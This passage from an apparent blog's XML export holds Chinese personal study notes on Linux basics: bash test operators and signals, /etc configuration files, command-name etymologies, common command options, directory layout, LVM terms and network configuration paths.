<td style="text-align: center;">字符串长度不为0返回true</td>
</tr>
<tr class="odd">
<td style="text-align: center;">$</td>
<td style="text-align: center;">字符串不为空返回true</td>
</tr>
</tbody>
</table>
<h4 id="文件测试运算符">文件测试运算符</h4>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">运算符</th>
<th style="text-align: center;">说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">-b</td>
<td style="text-align: center;">是块设备文件返回true</td>
</tr>
<tr class="even">
<td style="text-align: center;">-c</td>
<td style="text-align: center;">是字符设备文件返回true</td>
</tr>
<tr class="odd">
<td style="text-align: center;">-d</td>
<td style="text-align: center;">是文件夹返回true</td>
</tr>
<tr class="even">
<td style="text-align: center;">-f</td>
<td style="text-align: center;">是普通文件返回true</td>
</tr>
<tr class="odd">
<td style="text-align: center;">-g</td>
<td style="text-align: center;">设置了sgid位返回true</td>
</tr>
<tr class="even">
<td style="text-align: center;">-k</td>
<td style="text-align: center;">设置了粘滞位返回true</td>
</tr>
<tr class="odd">
<td style="text-align: center;">-p</td>
<td style="text-align: center;">是有名管道文件返回true</td>
</tr>
<tr class="even">
<td style="text-align: center;">-u</td>
<td style="text-align: center;">设置了suid位返回true</td>
</tr>
<tr class="odd">
<td style="text-align: center;">-r</td>
<td style="text-align: center;">是可读文件返回true</td>
</tr>
<tr class="even">
<td style="text-align: center;">-w</td>
<td style="text-align: center;">是可写文件返回true</td>
</tr>
<tr class="odd">
<td style="text-align: center;">-x</td>
<td style="text-align: center;">是可执行文件返回true</td>
</tr>
<tr class="even">
<td style="text-align: center;">-s</td>
<td style="text-align: center;">是空文件返回true</td>
</tr>
<tr class="odd">
<td style="text-align: center;">-e</td>
<td style="text-align: center;">文件/文件夹存在返回true</td>
</tr>
<tr class="even">
<td style="text-align: center;">-L</td>
<td style="text-align: center;">文件存在链接返回true</td>
</tr>
</tbody>
</table>
<hr />
<h3 id="函数">函数</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;function&gt; funname()&#123;</span><br><span class="line">	command1</span><br><span class="line">	command2</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="bash检查语法以及查看执行过程">bash检查语法以及查看执行过程</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -n   test.bash   <span class="comment">#查看bash是否存在语法错误</span></span><br><span class="line">bash -x   test.bash   <span class="comment">#查看bash详细的执行过程</span></span><br></pre></td></tr></table></figure>
<hr />
<h3 id="信号">信号</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> 1) SIGHUP       2) SIGINT       3) SIGQUIT      4) SIGILL       5) SIGTRAP</span><br><span class="line"> 6) SIGABRT      7) SIGBUS       8) SIGFPE       9) SIGKILL     10) SIGUSR1</span><br><span class="line">11) SIGSEGV     12) SIGUSR2     13) SIGPIPE     14) SIGALRM     15) SIGTERM</span><br><span class="line">16) SIGSTKFLT   17) SIGCHLD     18) SIGCONT     19) SIGSTOP     20) SIGTSTP</span><br><span class="line">21) SIGTTIN     22) SIGTTOU     23) SIGURG      24) SIGXCPU     25) SIGXFSZ</span><br><span class="line">26) SIGVTALRM   27) SIGPROF     28) SIGWINCH    29) SIGIO       30) SIGPWR</span><br><span class="line">31) SIGSYS      34) SIGRTMIN    35) SIGRTMIN+1  36) SIGRTMIN+2  37) SIGRTMIN+3</span><br><span class="line">38) SIGRTMIN+4  39) SIGRTMIN+5  40) SIGRTMIN+6  41) SIGRTMIN+7  42) SIGRTMIN+8</span><br><span class="line">43) SIGRTMIN+9  44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12 47) SIGRTMIN+13</span><br><span class="line">48) SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14 51) SIGRTMAX-13 52) SIGRTMAX-12</span><br><span class="line">53) SIGRTMAX-11 54) SIGRTMAX-10 55) SIGRTMAX-9  56) SIGRTMAX-8  57) SIGRTMAX-7</span><br><span class="line">58) SIGRTMAX-6  59) SIGRTMAX-5  60) SIGRTMAX-4  61) SIGRTMAX-3  62) SIGRTMAX-2</span><br><span class="line">63) SIGRTMAX-1  64) SIGRTMAX</span><br></pre></td></tr></table></figure>
<p><strong>Ctrl+c：sigint</strong>=<strong>kill -2</strong></p>
<h3 id="trap信号捕捉">trap信号捕捉</h3>
<p><code>trap</code>是不能捕捉sigkill信号的，kill -9
发送sigkill信号，程序必定停止运行</p>
<h3 id="read读变量">read读变量</h3>
<hr />
<h3 id="脚本使用选项">脚本使用选项</h3>
<h4 id="getopts">getopts</h4>
<p>内置变量<strong>$OPTARG</strong>，用于接收选项参数</p>
<p>选项索引<strong>$OPTIND</strong></p>
<p>获得最后的参数<code>shift $&#123;$OPTIND-1&#125;</code></p>
]]></content>
      <categories>
        <category>编程</category>
      </categories>
  </entry>
  <entry>
    <title>Linux-etc文件夹下的常见配置文件</title>
    <url>/Linux-etc%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%8B%E7%9A%84%E5%B8%B8%E8%A7%81%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<h4 id="配置文件">配置文件</h4>
<p><strong>profile</strong> *
所有用户登录时所执行的脚本,他会调用用户目录下的.profile .bashrc
.bash_login</p>
<p><strong>bash.bashrc</strong> * 用户新建一个<strong>bash
shell</strong>时所会执行的脚本文件</p>
<p><strong>rc.local</strong> * 系统完全启动后会执行其中的命令</p>
<p><strong>passwd</strong> *
用户名:密码:UID:GID:comment:家目录:shell</p>
<p><strong>shadow</strong></p>
<ul>
<li>用户名:加密后的密码:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志</li>
</ul>
<p><strong>gshadow</strong> * 用户组:用户组密码:用户组管理者:组成员</p>
<p><strong>group</strong> * 组名:密码:GID:组内用户列表</p>
<p><strong>login.defs</strong> *
使用<strong>useradd</strong>新建用户会从冲读取新用户权限的默认设定</p>
<p><strong>skel</strong> * 新创立用户家目录的骨架,内含隐藏配置文件</p>
<p><strong>nsswitch.conf</strong> *
记录了程序配置信息使用什么记录,类型有file,dns,等.表示了各种程序使用配置的优先级如果记录了项目使用file记录,会在/etc目录生成软件的同名配置文件,软件首先查询nss进程,获取配置文件信息后再使用数据</p>
<p><strong>logrotate.conf</strong> * 记录了日志切割计划</p>
<p><strong>rc.d/</strong> *
各种启动级别以及脚本文件,包括rc.sysinit,init.d目录,init.d目录下是可执行程序,用于在各级别启动级别下创建软链接</p>
]]></content>
      <categories>
        <category>linux知识</category>
      </categories>
  </entry>
  <entry>
    <title>Linux-修改启动内核</title>
    <url>/Linux-%E4%BF%AE%E6%94%B9%E5%90%AF%E5%8A%A8%E5%86%85%E6%A0%B8/</url>
    <content><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep menuentry /boot/grub/grub.cfg <span class="comment">#查看有哪些启动项,每行要注意menuentry_id_option后面的内容</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/default/grub</span><br><span class="line">GRUB_DEFAULT=<span class="variable">$menuentry_id_option</span>之后的内容&gt;<span class="string">&#x27;Ubuntu高级选项$menuentry_id_option gnulinux-advanced-64b318d1-d51c-4042-8be4-cb134abd8948中括号里边$menuentry_id_option之后的内容</span></span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>Linux-命令缩写及含义</title>
    <url>/Linux-%E5%91%BD%E4%BB%A4%E7%BC%A9%E5%86%99%E5%8F%8A%E5%90%AB%E4%B9%89/</url>
    <content><![CDATA[<h4 id="命令缩写">命令缩写:</h4>
<ul>
<li>ls = list(列出目录内容)</li>
<li>cd = Change Directory（改变目录）</li>
<li>su = switch user 切换用户</li>
<li>rpm = redhat package manager 红帽子打包管理器</li>
<li>pwd = print work directory 打印当前目录
显示出当前工作目录的绝对路径</li>
<li>ps = process status(进程状态，类似于windows的任务管理器)
常用参数:－auxf</li>
<li>ps -auxf 显示进程状态</li>
<li>df = disk free
其功能是显示磁盘可用空间数目信息及空间结点信息。换句话说，就是报告在任何安装的设备或目录中，还剩多少自由的空间。</li>
<li>rpm = 即RedHat Package Management，是RedHat的发明之一</li>
<li>rmdir = Remove Directory（删除目录）</li>
<li>rm = Remove（删除目录或文件） <span id="more"></span></li>
<li>cat = concatenate连锁 cat file1
file2&gt;&gt;file3把文件1和文件2的内容联合起来放到file3中</li>
<li>insmod = install module,载入模块</li>
<li>ln -s = link -soft 创建一个软链接，相当于创建一个快捷方式</li>
<li>mkdir = Make Directory(创建目录</li>
<li>touch = 摸一下,更新时间戳,常被用来创建文件</li>
<li>man = Manual</li>
<li>pwd = Print working directory</li>
<li>su = Swith user</li>
<li>cd = Change directory</li>
<li>ls = List files</li>
<li>ps = Process Status</li>
<li>mkdir = Make directory</li>
<li>rmdir = Remove directory</li>
<li>mkfs = Make file system</li>
<li>fsck = File system check</li>
<li>cat = Concatenate</li>
<li>uname = Unix name</li>
<li>df = Disk free</li>
<li>du = Disk usage</li>
<li>lsmod = List modules</li>
<li>mv = Move file</li>
<li>rm = Remove file</li>
<li>cp = Copy file</li>
<li>ln = Link files</li>
<li>mdadm = Multiple Disk and Device Administration
多磁盘和设备管理</li>
<li>fg = Foreground</li>
<li>bg = Background</li>
<li>chown = Change owner</li>
<li>chgrp = Change group</li>
<li>chmod = Change mode</li>
<li>umount = Unmount</li>
<li>dd = 本来应根据其功能描述“Convert an
copy”命名为“cc”，但“cc”已经被用以代表“C Complier”，所以命名为“dd”</li>
<li>tar = Tape archive</li>
<li>ldd = List dynamic dependencies</li>
<li>insmod = Install module</li>
<li>rmmod = Remove module</li>
<li>lsmod = List module</li>
<li>文件结尾的"rc"（如.bashrc、.xinitrc等） = Resource
configuration</li>
<li>Knnxxx / Snnxxx（位于rcx.d目录下） =
K（Kill）；S(Service)；nn（执行顺序号）；xxx（服务标识）</li>
<li>.a（扩展名a） = Archive，static library</li>
<li>.so（扩展名so） = Shared object，dynamically linked library</li>
<li>.o（扩展名o） = Object file，complied result of C/C++ source
file</li>
<li>RPM = Red hat package manager</li>
<li>dpkg = Debian package manager</li>
<li>apt = Advanced package tool（Debian或基于Debian的发行版中提供）</li>
</ul>
<h4 id="部分linux命令缩写">部分Linux命令缩写</h4>
<ul>
<li>FIFO = First In, First Out</li>
<li>GRUB = GRand Unified Bootloader</li>
<li>IFS = Internal Field Seperators</li>
<li>LILO = LInux LOader</li>
<li>MySQL = My是最初作者女儿的名字，SQL = Structured Query Language</li>
<li>PHP = Personal Home Page Tools = PHP Hypertext Preprocessor</li>
<li>PNG = PNG's Not GIF<br />
</li>
<li>PS = Prompt String</li>
<li>Perl = "Pratical Extraction and Report Language" = "Pathologically
Eclectic Rubbish Lister"</li>
<li>Python 得名于电视剧Monty Python's Flying Circus</li>
<li>Tcl = Tool Command Language</li>
<li>Tk = ToolKit</li>
<li>VT = Video Terminal</li>
<li>YaST = Yet Another Setup Tool</li>
<li>apache = "a patchy" server</li>
<li>apt = Advanced Packaging Tool</li>
<li>ar = archiver</li>
<li>as = assembler</li>
<li>awk = "Aho Weiberger and Kernighan" 三个作者的姓的第一个字母</li>
<li>bash = Bourne Again SHell</li>
<li>bc = Basic (Better) Calculator</li>
<li>bg = BackGround</li>
<li>biff = 作者Heidi
Stettner在U.C.Berkely养的一条狗,喜欢对邮递员汪汪叫。</li>
<li>cal = CALendar</li>
<li>cat = CATenate</li>
<li>cd = Change Directory</li>
<li>chgrp = CHange GRouP</li>
<li>chmod = CHange MODe</li>
<li>chown = CHange OWNer</li>
<li>chsh = CHange SHell</li>
<li>cmp = compare</li>
<li>cobra = Common Object Request Broker Architecture</li>
<li>comm = common</li>
<li>cp = CoPy</li>
<li>cpio = CoPy In and Out</li>
<li>cpp = C Pre Processor</li>
<li>cron = Chronos 希腊文时间</li>
<li>cups = Common Unix Printing System</li>
<li>cvs = Current Version System</li>
<li>daemon = Disk And Execution MONitor</li>
<li>dc = Desk Calculator</li>
<li>dd = Disk Dump</li>
<li>df = Disk Free</li>
<li>diff = DIFFerence</li>
<li>dmesg = diagnostic message</li>
<li>du = Disk Usage</li>
<li>ed = editor</li>
<li>egrep = Extended GREP</li>
<li>elf = Extensible Linking Format</li>
<li>elm = ELectronic Mail</li>
<li>emacs = Editor MACroS</li>
<li>eval = EVALuate</li>
<li>ex = EXtended</li>
<li>exec = EXECute</li>
<li>fd = file descriptors</li>
<li>fg = ForeGround</li>
<li>fgrep = Fixed GREP</li>
<li>fmt = format</li>
<li>fsck = File System ChecK</li>
<li>fstab = FileSystem TABle</li>
<li>fvwm = F*** Virtual Window Manager</li>
<li>gawk = GNU AWK</li>
<li>gpg = GNU Privacy Guard</li>
<li>groff = GNU troff</li>
<li>hal = Hardware Abstraction Layer</li>
<li>joe = Joe's Own Editor</li>
<li>ksh = Korn SHell</li>
<li>lame = Lame Ain't an MP3 Encoder</li>
<li>lex = LEXical analyser</li>
<li>lisp = LISt Processing = Lots of Irritating Superfluous
Parentheses</li>
<li>ln = LiNk</li>
<li>lpr = Line PRint</li>
<li>ls = list</li>
<li>lsof = LiSt Open Files</li>
<li>m4 = Macro processor Version 4</li>
<li>man = MANual pages</li>
<li>mawk = Mike Brennan's AWK</li>
<li>mc = Midnight Commander</li>
<li>mkfs = MaKe FileSystem</li>
<li>mknod = MaKe NODe</li>
<li>motd = Message of The Day</li>
<li>mozilla = MOsaic GodZILLa</li>
<li>mtab = Mount TABle</li>
<li>mv = MoVe</li>
<li>nano = Nano's ANOther editor</li>
<li>nawk = New AWK</li>
<li>nl = Number of Lines</li>
<li>nm = names</li>
<li>nohup = No HangUP</li>
<li>nroff = New ROFF</li>
<li>od = Octal Dump</li>
<li>passwd = PASSWorD</li>
<li>pg = pager</li>
<li>pico = PIne's message COmposition editor</li>
<li>pine = "Program for Internet News &amp; Email" = "Pine is not
Elm"</li>
<li>ping = 拟声 又 = Packet InterNet Grouper</li>
<li>pirntcap = PRINTer CAPability</li>
<li>popd = POP Directory</li>
<li>pr = pre</li>
<li>printf = PRINT Formatted</li>
<li>ps = Processes Status</li>
<li>pty = pseudo tty</li>
<li>pushd = PUSH Directory</li>
<li>pwd = Print Working Directory</li>
<li>rc = runcom = run command, rc还是plan9的shell</li>
<li>rev = REVerse</li>
<li>rm = ReMove</li>
<li>rn = Read News</li>
<li>roff = RunOFF</li>
<li>rpm = RPM Package Manager = RedHat Package Manager</li>
<li>nsswitch = network service switch 网络服务转换</li>
<li>rsh, rlogin, rvim中的r = Remote</li>
<li>rxvt = ouR XVT</li>
<li>seamoneky = 我</li>
<li>sed = Stream EDitor</li>
<li>seq = SEQuence</li>
<li>shar = SHell ARchive</li>
<li>slrn = S-Lang rn</li>
<li>ss = Socket Statistics 套接字统计</li>
<li>ssh = Secure SHell</li>
<li>ssl = Secure Sockets Layer</li>
<li>stty = Set TTY</li>
<li>su = Substitute User</li>
<li>svn = SubVersioN</li>
<li>tar = Tape ARchive</li>
<li>tcsh = TENEX C shell</li>
<li>tee = T (T形水管接口)</li>
<li>telnet = TEminaL over Network</li>
<li>termcap = terminal capability</li>
<li>terminfo = terminal information</li>
<li>tex = τέχνη的缩写，希腊文art</li>
<li>tr = traslate</li>
<li>troff = Typesetter new ROFF</li>
<li>tsort = Topological SORT</li>
<li>tty = TeleTypewriter</li>
<li>twm = Tom's Window Manager</li>
<li>tz = TimeZone</li>
<li>udev = Userspace DEV</li>
<li>ulimit = User's LIMIT</li>
<li>umask = User's MASK</li>
<li>uniq = UNIQue</li>
<li>vi = VIsual = Very Inconvenient</li>
<li>vim = Vi IMproved</li>
<li>wall = write all</li>
<li>wc = Word Count</li>
<li>wine = WINE Is Not an Emulator</li>
<li>xargs = eXtended ARGuments</li>
<li>xdm = X Display Manager</li>
<li>xlfd = X Logical Font Description</li>
<li>xmms = X Multimedia System</li>
<li>xrdb = X Resources DataBase</li>
<li>xwd = X Window Dump</li>
<li>yacc = yet another compiler compiler</li>
<li>Fish = the Friendly Interactive SHell</li>
<li>su = Switch User</li>
<li>MIME = Multipurpose Internet Mail Extensions</li>
<li>ECMA = European Computer Manufacturers Association</li>
<li>initrd = initialized RAM disk</li>
</ul>
<h3 id="转载自httpsblog.csdn.nethuyisuarticledetails55506771">转载自<a
href="https://blog.csdn.net/huyisu/article/details/55506771">https://blog.csdn.net/huyisu/article/details/55506771</a>*</h3>
]]></content>
      <categories>
        <category>linux知识</category>
      </categories>
  </entry>
  <entry>
    <title>Linux-常用命令及选项</title>
    <url>/Linux-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%8F%8A%E9%80%89%E9%A1%B9/</url>
    <content><![CDATA[<h3
id="本文章可以和文章计算机常用词汇搭配使用其中大部分选项全写都有记录可以查用汉译查英文">本文章可以和文章计算机常用词汇搭配使用，其中大部分选项全写都有记录，可以查用汉译查英文</h3>
<h3 id="linux-常用命令全拼"><a
href="https://www.runoob.com/w3cnote/linux-command-full-fight.html">Linux
常用命令全拼</a></h3>
<h4 id="cut-文本分块切割">cut 文本分块/切割:</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-d<span class="string">&quot;&quot;</span>	<span class="comment">#选择定界符</span></span><br><span class="line">-f<span class="string">&quot;&quot;</span>	<span class="comment">#选择被定界符分割的第几个</span></span><br><span class="line">-b 	<span class="comment">#以字节为单位进行分割。这些字节位置将忽略多字节字符边界，除非也指定了 -n 标志。</span></span><br><span class="line">-c 	<span class="comment">#以字符为单位进行分割。</span></span><br></pre></td></tr></table></figure>
<h4 id="grep-查找字符串">grep 查找字符串:</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-e	<span class="comment">#以正则表达式匹配文本</span></span><br><span class="line">-r	<span class="comment">#递归</span></span><br></pre></td></tr></table></figure>
<h4 id="rm-删除工具">rm 删除工具:</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-r 	<span class="comment">#递归</span></span><br><span class="line">-f 	<span class="comment">#强制</span></span><br></pre></td></tr></table></figure>
<h4 id="tar-打包工具">tar 打包工具:</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-z 	<span class="comment">#以gzip算法压缩/解压缩</span></span><br><span class="line">-j 	<span class="comment">#以bz2算法压缩/解压缩</span></span><br><span class="line">-c 	<span class="comment">#打包/建立一个压缩文件的参数指令</span></span><br><span class="line">-x 	<span class="comment">#解包</span></span><br><span class="line">-v 	<span class="comment">#显示过程</span></span><br><span class="line">-f 	<span class="comment">#指定档案名</span></span><br><span class="line">-t 	<span class="comment">#查看内容</span></span><br><span class="line">-r 	<span class="comment">#追加文件</span></span><br><span class="line">-O 	<span class="comment">#将文件解开到标准输出</span></span><br><span class="line">-p 	<span class="comment">#使用原文件的原来属性 </span></span><br></pre></td></tr></table></figure>
<h4 id="ls-查看文件">ls 查看文件:</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-l 	<span class="comment">#查看详细信息</span></span><br><span class="line">-a 	<span class="comment">#查看包括隐藏文件文件在框内的所有文件</span></span><br><span class="line">-h 	<span class="comment">#以人类可读写的方式换算文件大小单位</span></span><br></pre></td></tr></table></figure>
<h4 id="tr-转换">tr 转换:</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-d 	<span class="comment">#删除指定字符集</span></span><br><span class="line">-c 	<span class="comment">#反选字符,选择在字符集之外的字符</span></span><br></pre></td></tr></table></figure>
<h4 id="cp-复制">cp 复制:</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-r 	<span class="comment">#递归</span></span><br><span class="line">-p 	<span class="comment">#保留权限</span></span><br><span class="line">-d 	<span class="comment">#保留链接</span></span><br><span class="line">-a 	<span class="comment">#相当于-dpr</span></span><br><span class="line">-f 	<span class="comment">#强制覆盖</span></span><br><span class="line">-i 	<span class="comment">#覆盖时产生提示</span></span><br></pre></td></tr></table></figure>
<h4 id="ln-生成文件链接">ln 生成文件链接:</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-s 	<span class="comment">#生成软链接</span></span><br></pre></td></tr></table></figure>
<h4 id="file-查看文件属性">file 查看文件属性:</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-L 	<span class="comment">#直接显示符号连接所指向的文件的类别</span></span><br><span class="line">-z 	<span class="comment">#尝试去解读压缩文件的内容</span></span><br></pre></td></tr></table></figure>
<h4 id="chmod-修改权限">chmod 修改权限</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-r 递归修改权限</span><br></pre></td></tr></table></figure>
<h4 id="chown-修改所属主组">chown 修改所属主/组:</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">所属组:所属主</span><br></pre></td></tr></table></figure>
<h4 id="chsh-修改shell">chsh 修改shell:</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-s 	<span class="comment">#指定shell</span></span><br></pre></td></tr></table></figure>
<h4 id="cd-切换目录">cd 切换目录:</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">- 	<span class="comment">#上一次目录</span></span><br><span class="line">.. 	<span class="comment">#上一级目录</span></span><br><span class="line">.	<span class="comment">#当前目录</span></span><br></pre></td></tr></table></figure>
<h4 id="ip">ip:</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">addr <span class="comment">#获取网卡信息</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>linux知识</category>
      </categories>
  </entry>
  <entry>
    <title>Linux-文件转二进制输出</title>
    <url>/Linux-%E6%96%87%E4%BB%B6%E8%BD%AC%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BE%93%E5%87%BA/</url>
    <content><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xxd -b ctf_chache/ZipCenOp.jar | <span class="built_in">cut</span> -d <span class="string">&quot; &quot;</span> -f2-7 | sed -e <span class="string">&#x27;s/ //g&#x27;</span> -e <span class="string">&#x27;:a;N;$!ba;s/\n//g&#x27;</span> | sed <span class="string">&#x27;s/ //g&#x27;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>linux技术</category>
      </categories>
  </entry>
  <entry>
    <title>Linux文件夹详解</title>
    <url>/Linux-%E6%A0%B9%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<h4
id="linux根目录下各个系统文件夹的含义和用途">Linux根目录"/"下各个系统文件夹的含义和用途</h4>
<h5 id="中英对照">中英对照</h5>
<p>/bin = BINaries<br />
/sbin = Superuser BINaries</p>
<p>/sys=SYStem /proc = PROCesses</p>
<p>/var = VARiable<br />
/usr = Unix Shared Resources<br />
/opt=OPTional application software packages</p>
<p>/etc = ETCetera<br />
/mnt=MouNT /dev = DEVices<br />
/lib = LIBrary<br />
/srv=SeRVice /tmp = TeMPorary</p>
<h5 id="详细说明">详细说明</h5>
<p><strong>/boot</strong>
该目录默认下存放的是Linux的启动文件和内核。</p>
<p><strong>/initrd</strong> 它的英文含义是boot loader initialized RAM
disk,就是由boot loader初始化的内存盘。在linux 内核启动前，boot
loader会将存储介质(一般是硬盘)中的initrd文件加载到内存，内核启动时会在访问真正的根文件系统前先访问该内存中的initrd文件系统。</p>
<p><strong>/bin</strong> 该目录中存放Linux的常用命令。</p>
<p><strong>/sbin</strong> 该目录用来存放系统管理员使用的管理程序。</p>
<p><strong>/var</strong>
该目录存放那些经常被修改的文件，包括各种日志、数据文件。</p>
<p><strong>/etc</strong>
该目录存放系统管理时要用到的各种配置文件和子目录，例如网络配置文件、文件系统、X系统配置文件、设备配置信息、设置用户信息等。</p>
<p><strong>/dev</strong>
该目录包含了Linux系统中使用的所有外部设备，它实际上是访问这些外部设备的端口，访问这些外部设备与访问一个文件或一个目录没有区别。</p>
<p><strong>/mnt</strong> 临时将别的文件系统挂在该目录下。</p>
<p><strong>/root</strong>
如果你是以超级用户的身份登录的，这个就是超级用户的主目录。</p>
<p><strong>/home</strong>
如果建立一个名为“xx”的用户，那么在/home目录下就有一个对应的“/home/xx”路径，用来存放该用户的主目录。</p>
<p><strong>/usr</strong> 用户的应用程序和文件几乎都存放在该目录下。</p>
<p><strong>/lib</strong>
该目录用来存放系统动态链接共享库，几乎所有的应用程序都会用到该目录下的共享库。</p>
<p><strong>/opt</strong>
第三方软件在安装时默认会找这个目录,所以你没有安装此类软件时它是空的,但如果你一旦把它删除了,以后在安装此类软件时就有可能碰到麻烦。</p>
<p><strong>/tmp</strong>
用来存放不同程序执行时产生的临时文件，该目录会被系统自动清理干净。</p>
<p><strong>/proc</strong>
可以在该目录下获取系统信息，这些信息是在内存中由系统自己产生的，该目录的内容不在硬盘上而在内存里。</p>
<p><strong>/misc</strong> 可以让多用户堆积和临时转移自己的文件。</p>
<p><strong>/lost＋found</strong>
该目录在大多数情况下都是空的。但当突然停电、或者非正常关机后，有些文件就临时存放在这里。</p>
<p><strong>文件颜色的含义</strong>：蓝色为文件夹；绿色是可执行文件；浅蓝色是链接文件；红框文件是加了SUID位，任意限权；红色为压缩文件；褐色为设备文件。</p>
<p><strong>sys</strong>:临时文件系统,不存放文件,存放硬件相关参数</p>
<p><strong>proc</strong>:临时文件系统,不存放文件,存放内核相关参数</p>
<p><strong>boot</strong>:启动相关</p>
<p><strong>dev</strong>:设备文件&lt;分块设备文件,字符设备文件&gt;</p>
<p><strong>etc</strong>:配置文件</p>
<p><strong>media</strong>:挂载点</p>
<p><strong>mnt</strong>:挂载点</p>
<p><strong>bin</strong>:二进制可执行文件</p>
<p><strong>lib</strong>:库文件 分动态链接库 .so 静态链接库 .a</p>
<p><strong>lib64</strong>:64位系统所用的库</p>
<p><strong>usr</strong>:user shared read-only</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/bin </span><br><span class="line">/usr/sbin</span><br><span class="line">/usr/lib</span><br></pre></td></tr></table></figure>
<p>上面的库与系统启动有关,不可缺失</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/local/bin</span><br><span class="line">/usr/local/sbin</span><br><span class="line">/usr/local/lib</span><br></pre></td></tr></table></figure>
<p>上面的库和二进制可执行文件,与系统运行无关,但和服务运行有关</p>
<p><strong>opt</strong>:可有可无的文件目录</p>
<p><strong>root</strong>:根权限用户目录</p>
<p><strong>home</strong>:用户目录</p>
]]></content>
      <categories>
        <category>linux知识</category>
      </categories>
  </entry>
  <entry>
    <title>Linux-模型</title>
    <url>/Linux-%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<h2 id="网络模型">网络模型</h2>
<h3 id="osi七层模型">OSI七层模型</h3>
<h3 id="tcpip五层模型">TCP/IP五层模型</h3>
<h2 id="进程线程模型">进程线程模型</h2>
<h3 id="动态运行库">动态运行库</h3>
<ul>
<li>在不同程序同时引用同样的动态库的时候,内核将运行库映射到各自的程序运行空间(虚拟4GB)</li>
</ul>
<h2
id="不可以使用不同核心运行同一个程序因为指令间必须顺序执行">不可以使用不同核心运行同一个程序,因为指令间必须顺序执行</h2>
<ul>
<li>但是,不同核心可以调用多个线程,每个线程顺序执行,充分利用CPU性能</li>
</ul>
<h3 id="多进程">多进程</h3>
<ul>
<li>使用同一个cpu,由内核调度各程序的执行次序,有自己的代码段,初始化变量段,未初始化变量段,堆,栈</li>
</ul>
<h3 id="多线程">多线程</h3>
<ul>
<li>使用多个cpu/核心,线程之间可相互共享信息,例如共用堆栈</li>
</ul>
]]></content>
      <categories>
        <category>linux知识</category>
      </categories>
  </entry>
  <entry>
    <title>Linux-物理卷、卷组、逻辑卷</title>
    <url>/Linux-%E7%89%A9%E7%90%86%E5%8D%B7%E3%80%81%E5%8D%B7%E7%BB%84%E3%80%81%E9%80%BB%E8%BE%91%E5%8D%B7/</url>
    <content><![CDATA[<blockquote>
<p>物理存储介质（PhysicalStorageMedia）：指系统的物理存储设备==&gt;磁盘，如：/dev/hda、/dev/sda等，是存储系统最底层的存储单元。</p>
</blockquote>
<blockquote>
<p>物理卷（Physical
Volume，PV）：指磁盘分区或从逻辑上与磁盘分区具有同样功能的设备（如RAID），是LVM的基本存储逻辑块，但和基本的物理存储介质（如分区、磁盘等）比较，却包含有与LVM相关的管理参数。</p>
</blockquote>
<blockquote>
<p>卷组（Volume
Group,VG）：是由一个或多个物理卷所组成的存储池，在卷组上能创建一个或多个逻辑卷。</p>
</blockquote>
<blockquote>
<p>逻辑卷（Logical
Volume,LV）：类似于非LVM系统中的硬盘分区，它建立在卷组之上，是一个标准的块设备，在逻辑卷之上可以建立文件系统。</p>
</blockquote>
<blockquote>
<p>可以做这样一个设想来理解以上三者的关系：如果把PV比作地球的一个板块，VG则是一个地球，因为地球是由多个板块组成的，那么在地球上划分一个区域并标记为亚洲，则亚洲就相当于一个LV。</p>
</blockquote>
]]></content>
      <categories>
        <category>linux知识</category>
      </categories>
  </entry>
  <entry>
    <title>Linux-路由添加</title>
    <url>/Linux-%E8%B7%AF%E7%94%B1%E6%B7%BB%E5%8A%A0/</url>
    <content><![CDATA[<h2 id="网络配置">网络配置</h2>
<h4 id="dns服务器配置">DNS服务器配置</h4>
<p><strong>/etc/resolv.conf</strong> ##### 格式 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nameserver DNS_SERVER_IP1</span><br><span class="line">nameserver DNS_SERVER_IP2</span><br></pre></td></tr></table></figure></p>
<h3 id="rhel">RHEL</h3>
<h4 id="网络配置文件">网络配置文件</h4>
<p><strong>/etc/sysconfig/network</strong></p>
<h5 id="主机名配置">主机名配置</h5>
<p><strong>/etc/sysconfig/network</strong></p>
<h4 id="网络接口配置文件">网络接口配置文件</h4>
